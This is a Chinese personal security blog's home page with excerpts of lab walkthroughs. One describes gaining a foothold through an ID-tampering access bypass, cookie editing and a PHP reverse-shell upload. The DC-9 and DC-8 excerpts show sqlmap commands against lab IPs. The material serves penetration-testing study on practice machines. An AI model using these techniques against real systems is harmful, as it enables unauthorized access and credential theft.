+80和22端口有服务在运行，先从80端口入手
+在访问80端口的服务时看到这一句话，就是要让我们找登录页，但是并没有找到可以点击登录的地方
+
+路径泄漏
+F12打开调试就看到了泄露的路径
+
+看到可以以游客的身份登录
+
+登陆后看到有上传的地方，这就是我们的突破口
+但是需要超级管理员的账号
+
+越权
+当点进Account页面的时候URL引起了注意，id=2，那就意味着id=1是管理员账号了，那就试试
+
+Account确实是变成了admin，但是点到Uploads的时候还是显示需要管理员账号，那我们可以尝试看看能不能从cookie入手
+
+对应修改好后，上传页就能用了
+
+
+上传webshell
+用的是kali自带的php-reverse-shell.php，使用方法GitHub上有
+利用成功，找有用的信息
+
+信息收集
+在/var/www/html/cdn-cgi/login目录下发现了db.php，并且拿到了数据库的账号密码，
+
+在/home/robert下拿到了user.txt
+
+切换交 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/51806/" title="给主机加无线网卡"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/%E7%BD%91%E5%8D%A1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="给主机加无线网卡"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/51806/" title="给主机加无线网卡">给主机加无线网卡</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-03-16T13:01:46.000Z" title="发表于 2023-03-16 21:01:46">2023-03-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E7%A2%8E/">生活琐碎</a></span></div><div class="content">0x01
+去年（22年）6月份收了一个大四学长的主机，具体配置如下：
+
+其中无线网卡是最近才加上的，因为我现在是双机状态，一台笔记本（小米笔记本Pro14增强版），一台主机，经常要在两台机器之间互换，键鼠的切换就挺麻烦的，要两套键鼠的话就挺难受的，因为桌面空间不算很大，而且键盘搬来搬去的就挺麻烦的，就想着全部无线化。键盘是三模的，就可以同时连接多台设备按相应的组合键去切换设备就好，鼠标用两个无线的鼠标就行，反正鼠标不算占地。
+0x02
+买了COMFAST的CF-AX201，到货之后就直接开装
+
+装完打完驱动，发现只有蓝牙能用，WiFi用不了，然后问客服才知道是一块m2硬盘抢了WiFi的通道，然后百度解决方案，发现这是这个主板的问题
+
+被迫无奈去淘宝找了个延长线，因为我的显卡太大了，完全盖住了pcie3的接口，问了客服延长线需要7mm的高度，我还特地拿个尺子去量，刚刚好就是7mm左右
+
+买回来装上非常完美，现在就是可以完美发挥这张网卡的所有功能
+
+</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/3805/" title="docker单机部署GZCTF"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/gzctf-favicon.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="docker单机部署GZCTF"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/3805/" title="docker单机部署GZCTF">docker单机部署GZCTF</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-02-21T13:04:25.000Z" title="发表于 2023-02-21 21:04:25">2023-02-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></span></div><div class="content">仅docker部署GZCTF的详细教程</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/60343/" title="新年快乐"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/IMG_20230122_001625.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="新年快乐"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/60343/" title="新年快乐">新年快乐</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-01-21T16:50:40.000Z" title="发表于 2023-01-22 00:50:40">2023-01-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%94%9F%E6%B4%BB%E7%90%90%E7%A2%8E/">生活琐碎</a></span></div><div class="content">癸卯年 兔癸丑月 庚辰日
+大年初一放烟花的相片
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/5012/" title="DC-9复现"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/wallhaven-7p39gy.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-9复现"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/5012/" title="DC-9复现">DC-9复现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-12-01T08:50:00.000Z" title="发表于 2022-12-01 16:50:00">2022-12-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%9D%B6%E5%9C%BA-%E9%9D%B6%E6%9C%BA/">靶场&amp;靶机</a></span></div><div class="content">DC-9复现
+描述
+
+DC-9是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
+这个挑战的最终目标是获得根并阅读唯一的标志。
+Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。
+对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。
+
+信息收集
+确定目标的ip以及开启的端口
+
+发现有一个完整的表单，那就直接sqlmap爆破数据库
+
+1sqlmap -u &quot;http://192.168.71.131/results.php&quot;  --data &quot;search=1&quot; --dbs
+爆出三个库
+
+爆破表
+1sqlmap -u &quot;http://192.168.71.131/results.php&quot;  --data &quot;search=1&quot; -D users --tables
+
+爆破列
+1sqlmap -u &quot;http://192.168.71. ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/54148/" title="DC-8复现"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/wallhaven-o59gvl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-8复现"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/54148/" title="DC-8复现">DC-8复现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-12-01T06:57:00.000Z" title="发表于 2022-12-01 14:57:00">2022-12-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E9%9D%B6%E5%9C%BA-%E9%9D%B6%E6%9C%BA/">靶场&amp;靶机</a></span></div><div class="content">DC-8复现
+描述
+
+DC-8是另一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
+这个挑战有点混合，既是实际挑战，又是关于在Linux上安装和配置的双因素身份验证是否可以防止Linux服务器被利用的“概念证明”。
+这个挑战的“概念验证”部分是由于Twitter上被问到一个关于双因素身份验证和Linux的问题，也是由于@theart42的建议。
+此挑战的最终目标是绕过双因素身份验证，获取root并读取唯一的标志。
+除非您尝试通过SSH登录，否则您甚至可能不知道安装和配置了双因素身份验证，但它肯定在那里并且正在做它的工作。
+Linux 技能和对 Linux 命令行的熟悉是必须的，对基本渗透测试工具的一些经验也是必须的。
+对于初学者来说，谷歌可以提供很大的帮助，但你总是可以在@DCAU7发推文给我寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。
+
+信息收集
+确认目标机器的IP以及开启的端口
+
+访问80端口，点击welcome to DC-8发现这个url有点问题，猜想有sql注入
+
+扫描目录看看有没有登录口
+1dirsearch -u 1 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://img.a1pha.cn/blog/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">alpha</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/a1phaaa"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/a1phaaa" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:crzliang@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些学习笔记</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/23677/" title="Freefloat FTP Server1.0 溢出漏洞复现"><img src="https://img.a1pha.cn/img/202312071129688.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Freefloat FTP Server1.0 溢出漏洞复现"/></a><div class="content"><a class="title" href="/archives/23677/" title="Freefloat FTP Server1.0 溢出漏洞复现">Freefloat FTP Server1.0 溢出漏洞复现</a><time datetime="2023-12-04T16:00:00.000Z" title="发表于 2023-12-05 00:00:00">2023-12-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/7517/" title="应急响应技术"><img src="https://img.a1pha.cn/img/202312071152526.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应技术"/></a><div class="content"><a class="title" href="/archives/7517/" title="应急响应技术">应急响应技术</a><time datetime="2023-12-03T16:00:00.000Z" title="发表于 2023-12-04 00:00:00">2023-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/52264/" title="权限维持技术"><img src="https://img.a1pha.cn/img/202312071143184.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持技术"/></a><div class="content"><a class="title" href="/archives/52264/" title="权限维持技术">权限维持技术</a><time datetime="2023-12-02T16:00:00.000Z" title="发表于 2023-12-03 00:00:00">2023-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/59627/" title="社会工程学钓鱼样本的制作"><img src="https://img.a1pha.cn/img/202312071153243.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="社会工程学钓鱼样本的制作"/></a><div class="content"><a class="title" href="/archives/59627/" title="社会工程学钓鱼样本的制作">社会工程学钓鱼样本的制作</a><time datetime="2023-12-01T16:00:00.000Z" title="发表于 2023-12-02 00:00:00">2023-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/28937/" title="vscode网页版搭建"><img src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/blog/vscode.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vscode网页版搭建"/></a><div class="content"><a class="title" href="/archives/28937/" title="vscode网页版搭建">vscode网页版搭建</a><time datetime="2023-07-31T05:40:48.000Z" title="发表于 2023-07-31 13:40:48">2023-07-31</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            <a class="card-more-btn" href="/categories/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a>
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/BUUCTF/"><span class="card-category-list-name">BUUCTF</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">5</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTFshow/"><span class="card-category-list-name">CTFshow</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/HTB/"><span class="card-category-list-name">HTB</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/vscode/"><span class="card-category-list-name">vscode</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/wsl/"><span class="card-category-list-name">wsl</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0/"><span class="card-category-list-name">学习</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%BC%80%E5%8F%91/"><span class="card-category-list-name">开发</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/docker/" style="font-size: 1.1em; color: #999">docker</a> <a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%BB%84%E7%BD%91/" style="font-size: 1.1em; color: #999">路由器组网</a> <a href="/tags/%E5%B7%A5%E6%8E%A7/" style="font-size: 1.1em; color: #999">工控</a> <a href="/tags/Windows/" style="font-size: 1.23em; color: #999ea6">Windows</a> <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 1.3em; color: #99a1ac">运维</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 1.1em; color: #999">前端</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.1em; color: #999">开发</a> <a href="/tags/vulnhub/" style="font-size: 1.43em; color: #99a6b9">vulnhub</a> <a href="/tags/GZCTF/" style="font-size: 1.1em; color: #999">GZCTF</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 1.1em; color: #999">漏洞复现</a> <a href="/tags/web/" style="font-size: 1.23em; color: #999ea6">web</a> <a href="/tags/HTB/" style="font-size: 1.23em; color: #999ea6">HTB</a> <a href="/tags/wsl/" style="font-size: 1.1em; color: #999">wsl</a> <a href="/tags/Linux/" style="font-size: 1.17em; color: #999c9f">Linux</a> <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8A%80%E6%9C%AF/" style="font-size: 1.1em; color: #999">应急响应技术</a> <a href="/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E9%92%93%E9%B1%BC%E6%A0%B7%E6%9C%AC%E7%9A%84%E5%88%B6%E4%BD%9C/" style="font-size: 1.1em; color: #999">社会工程学钓鱼样本的制作</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E7%90%90%E7%A2%8E/" style="font-size: 1.17em; color: #999c9f">生活琐碎</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C/" style="font-size: 1.3em; color: #99a1ac">网络渗透测试技术实验</a> <a href="/tags/Git/" style="font-size: 1.1em; color: #999">Git</a> <a href="/tags/Excel-%E5%AE%8F/" style="font-size: 1.1em; color: #999">Excel 宏</a> <a href="/tags/%E7%BD%91%E5%AE%89%E5%B0%8F%E5%AD%A6%E6%9C%9F/" style="font-size: 1.1em; color: #999">网安小学期</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 1.5em; color: #99a9bf">渗透测试</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 1.23em; color: #999ea6">比赛</a> <a href="/tags/vscode/" style="font-size: 1.1em; color: #999">vscode</a> <a href="/tags/pikachu/" style="font-size: 1.1em; color: #999">pikachu</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.1em; color: #999">学习</a> <a href="/tags/CTF/" style="font-size: 1.37em; color: #99a4b2">CTF</a> <a href="/tags/flash%E9%92%93%E9%B1%BC/" style="font-size: 1.1em; color: #999">flash钓鱼</a> <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/" style="font-size: 1.1em; color: #999">权限维持技术</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">二月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">35</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">32k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-03-20T12:12:57.109Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://img.a1pha.cn/blog/bg-1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By alpha</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>桂ICP备2022011217号-2</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.staticfile.net/hexo-theme-butterfly/4.12.0/js/utils.js"></script><script src="https://cdn.staticfile.net/hexo-theme-butterfly/4.12.0/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>window.typedJSFn = {
+  init: (str) => {
+    window.typed = new Typed('#subtitle', Object.assign({
+      strings: str,
+      startDelay: 300,
+      typeSpeed: 150,
+      loop: true,
+      backSpeed: 50,
+    }, null))
+  },
+  run: (subtitleType) => {
+    if (true) {
+      if (typeof Typed === 'function') {
+        subtitleType()
+      } else {
+        getScript('https://cdn.jsdelivr.net/npm/typed.js/dist/typed.umd.min.js').then(subtitleType)
+      }
+    } else {
+      subtitleType()
+    }
+  }
+}
+</script><script>function subtitleType () {
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      if (true) {
+        const from = '出自 ' + data.from
+        const sub = []
+        sub.unshift(data.hitokoto, from)
+        typedJSFn.init(sub)
+      } else {
+        document.getElementById('subtitle').textContent = data.hitokoto
+      }
+    })
+}
+typedJSFn.run(subtitleType)
+</script></div><script async src="js/title.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="https://cdn.staticfile.net/hexo-theme-butterfly/4.12.0/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="archives/3805/" alt=""><img width="48" height="48" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/gzctf-favicon.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2023-02-21</span><a class="blog-slider__title" href="archives/3805/" alt="">docker单机部署GZCTF</a><div class="blog-slider__text">仅docker部署GZCTF的详细教程</div><a class="blog-slider__button" href="archives/3805/" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="archives/52933/" alt=""><img width="48" height="48" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/wallhaven-9mg3ww.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-09-26</span><a class="blog-slider__title" href="archives/52933/" alt="">招新平台的搭建与维护</a><div class="blog-slider__text">利用CTFd搭建CTF招新平台，并实现动态容器环境及动态flag，以及个性化修改</div><a class="blog-slider__button" href="archives/52933/" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
